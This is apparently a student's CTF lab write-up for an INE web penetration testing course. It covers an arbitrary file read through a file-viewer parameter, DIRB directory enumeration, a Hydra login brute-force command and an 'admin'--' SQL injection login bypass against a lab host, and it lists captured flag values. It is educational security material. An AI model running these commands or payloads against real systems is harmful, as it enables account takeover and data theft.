# Lab Notes – Web Application Penetration Testing CTF 1

**Platform:** INE  
**Course:** Web Application Penetration Testing  
**Lab:** Web Application Penetration Testing CTF 1  
**Operating System:** Kali Linux  
**Target:** `http://target.ine.local`

---

## Lab Environment

The lab provided GUI access to Kali Linux and a target web application.

### Useful Wordlists

```text
/usr/share/wordlists/dirb/common.txt

/usr/share/seclists/Usernames/top-usernames-shortlist.txt

/root/Desktop/wordlists/100-common-passwords.txt
```

### Objectives

1. **Flag 1:** Sometimes, important files are hidden in plain sight. Check the root ('/') directory for a file named 'flag.txt' that might hold the key to the first flag.
2. **Flag 2:** Explore the structure of the server's directories. Enumeration might reveal hidden treasures.
3. **Flag 3:** The login form seems a bit weak. Trying out different combinations might just reveal the next flag.
4. **Flag 4:** The login form behaves oddly with unexpected inputs. Think of injection techniques to access the 'admin' account and find the flag.

---

# Flag 1 – Arbitrary File Read Through the File Viewer

## Step 1 – Exploring the File Viewer

While browsing the website in Firefox, I discovered a file viewer functionality.

The application used the following URL structure:

```text
http://target.ine.local/view_file?file=filename
```

To test the functionality, I first accessed:

```text
http://target.ine.local/view_file?file=file3.txt
```

The application displayed the contents of `file3.txt`.

This revealed that the application accepted a filename through the `file` URL parameter.

## Step 2 – Accessing the Flag File

I modified the `file` parameter to request the flag file:

```text
http://target.ine.local/view_file?file=/flag.txt
```

The application displayed the contents of the requested file.

## Flag 1 Captured

```text
FLAG1_3b79698da07b4e848120f6a17c26a0c4
```

## Technical Explanation

The application appeared to allow users to control the requested file path without sufficient restrictions.

This behaviour is consistent with an arbitrary file-read vulnerability and may be associated with Local File Inclusion (LFI).

### Key Learnings

- Understanding URL parameters.
- Testing file viewer functionality.
- Identifying insecure file handling.
- Recognizing the risks of unrestricted file access.

---

# Flag 2 – Directory Enumeration Using DIRB

## Step 1 – Enumerating Web Directories

I used DIRB to discover hidden directories and resources.

```bash
dirb http://target.ine.local/
```

**Command explanation:**

- `dirb` – Web content scanner.
- `http://target.ine.local/` – Target website.
- DIRB uses its default common wordlist to discover accessible paths.

### Findings

```text
/about       (CODE:200)
/login       (CODE:200)
/logout      (CODE:302)
/secured     (CODE:308)
```

The `/secured` directory was particularly interesting.

## Step 2 – Exploring the Secured Directory

I opened the following URL in Firefox:

```text
http://target.ine.local/secured/
```

The browser displayed a JSON response:

```json
[
  "flag.txt"
]
```

This revealed a file named `flag.txt` inside the secured directory.

## Step 3 – Retrieving Flag 2

After discovering the filename, I accessed the file directly:

```text
http://target.ine.local/secured/flag.txt
```

The application displayed the file contents, allowing me to capture Flag 2.

**Flag 2 captured successfully.**

*The exact flag value was not retained in my available notes.*

## Technical Explanation

The `/secured/` endpoint exposed information about files stored inside the directory.

Despite its name, the directory listing revealed a file that could be accessed through the browser.

### Key Learnings

- Directory enumeration using DIRB.
- Understanding HTTP response codes.
- Identifying exposed resources through JSON responses.
- Recognizing the risks of publicly accessible directories.

---

# Flag 3 – HTTP Login Brute-Forcing

## Step 1 – Identifying the Login Page

During directory enumeration, DIRB discovered:

```text
http://target.ine.local/login
```

The page contained a username and password authentication form.

I decided to test the login mechanism using Hydra.

## Step 2 – Initial Hydra Attempt

My first attempt was:

```bash
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /root/Desktop/wordlists/100-common-passwords.txt target.ine.local http-post
```

**Command explanation:**

- `hydra` – Authentication testing tool.
- `-L` – Specifies a username wordlist.
- `top-usernames-shortlist.txt` – Username wordlist.
- `-P` – Specifies a password wordlist.
- `100-common-passwords.txt` – Password wordlist.
- `http-post` – HTTP POST authentication module.

### Result

```text
1 of 1 target completed, 0 valid password found
```

Hydra did not discover valid credentials.

The output also indicated that the web page needed to be supplied as an additional option.

## Step 3 – Correcting the Hydra Command

After identifying the actual login endpoint, I used Hydra's `http-post-form` module.

```bash
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /root/Desktop/wordlists/100-common-passwords.txt target.ine.local http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid username or password"
```

**Command explanation:**

- `http-post-form` – Tests an HTTP POST login form.
- `/login` – Login endpoint.
- `username=^USER^` – Hydra substitutes usernames from the wordlist.
- `password=^PASS^` – Hydra substitutes passwords from the wordlist.
- `F=Invalid username or password` – Defines the failure response used to identify unsuccessful login attempts.

## Step 4 – Valid Credentials Discovered

Hydra successfully discovered:

```text
Username: guest
Password: <redacted>
```

The password is intentionally omitted from this public repository.

## Step 5 – Accessing the User Profile

The browser displayed the following profile URL:

```text
http://target.ine.local/profile/2?name=Bob+Guest
```

The profile page contained:

```text
Username:
guest

Name:
Bob Guest

Secret String:
FLAG3_c07e61404a4f46b1ba72457032b08d23
```

## Flag 3 Captured

```text
FLAG3_c07e61404a4f46b1ba72457032b08d23
```

## Technical Explanation

The login form accepted weak credentials that were present in the supplied password wordlist.

This demonstrated how weak passwords can expose accounts to automated authentication attacks.

### Key Learnings

- Hydra username and password wordlists.
- HTTP POST form testing.
- Identifying login failure messages.
- Why the correct endpoint and form parameters matter.
- Risks associated with weak passwords.

---

# Flag 4 – SQL Injection Authentication Bypass

## Step 1 – Investigating the Login Form

The final objective suggested that the login form behaved unexpectedly when receiving unusual input.

I investigated the login form for possible SQL injection vulnerabilities.

## Step 2 – Testing the Username Field

In the username field, I entered:

```sql
admin'--
```

For the password field, I entered an arbitrary password.

Then I clicked the **Log In** button.

## Step 3 – Understanding the SQL Injection

A vulnerable application might construct a SQL query similar to:

```sql
SELECT * FROM users
WHERE username = 'admin' AND password = 'anything';
```

The username input:

```sql
admin'--
```

could modify the resulting query to:

```sql
SELECT * FROM users
WHERE username = 'admin'--' AND password = 'anything';
```

In SQL dialects that recognize `--` as a comment marker, the remaining part of the query is ignored.

This can bypass password verification when user input is directly concatenated into SQL queries.

## Step 4 – Accessing the Administrator Profile

After submitting the login form, the application redirected me to:

```text
http://target.ine.local/profile/1?name=Admin+Account
```

The profile page confirmed access to the administrator account.

The displayed information included:

```text
Username:
admin

Name:
Admin Account

Secret String:
FLAG4_c3c66bc460e147f19efc9ba38a86c1e7
```

## Flag 4 Captured

```text
FLAG4_c3c66bc460e147f19efc9ba38a86c1e7
```

## Technical Explanation

The login form appeared vulnerable to SQL injection because user-controlled input was interpreted as part of the authentication query.

The SQL comment marker allowed the remainder of the query to be ignored, potentially bypassing password verification.

### Key Learnings

- Identifying possible SQL injection vulnerabilities.
- Understanding SQL comment syntax.
- Authentication bypass through unsafe SQL query construction.
- Importance of parameterized SQL queries.
- Verifying successful access through application responses.

---

# Final Flag Summary

| Flag | Technique | Location | Status |
|---|---|---|---|
| Flag 1 | Arbitrary file read | `/flag.txt` | Captured |
| Flag 2 | Directory enumeration | `/secured/flag.txt` | Captured |
| Flag 3 | HTTP brute-forcing | Guest profile | Captured |
| Flag 4 | SQL injection | Administrator profile | Captured |

## Confirmed Flag Values

| Flag | Value |
|---|---|
| Flag 1 | `FLAG1_3b79698da07b4e848120f6a17c26a0c4` |
| Flag 3 | `FLAG3_c07e61404a4f46b1ba72457032b08d23` |
| Flag 4 | `FLAG4_c3c66bc460e147f19efc9ba38a86c1e7` |

Flag 2 was successfully captured, but its exact value was not preserved in the available notes.

---

# Key Takeaways

1. **File Disclosure:** File viewer functionality can expose sensitive server files when paths are not properly restricted.
2. **Directory Enumeration:** DIRB helps discover hidden application paths and exposed resources.
3. **Weak Authentication:** Hydra can identify weak credentials when login protections are insufficient.
4. **SQL Injection:** Unsafe SQL query construction can allow authentication bypass.
5. **Manual Testing:** Browser-based investigation is essential for understanding how web applications respond to unexpected input.

---

# Conclusion

I successfully completed all four objectives in the INE Web Application Penetration Testing CTF 1 lab.

The lab provided practical experience with arbitrary file reading, directory enumeration, HTTP authentication testing, and SQL injection.

One of the most important lessons was that web application security testing requires a combination of automated tools and manual investigation.

DIRB and Hydra helped identify potential weaknesses, while Firefox allowed me to inspect application behaviour, access exposed files, and verify the vulnerabilities.

---

## Responsible Use

All activities documented in these notes were performed in an authorized INE Skill Check Lab environment.

These techniques should only be used for educational purposes and against systems for which explicit authorization has been granted.
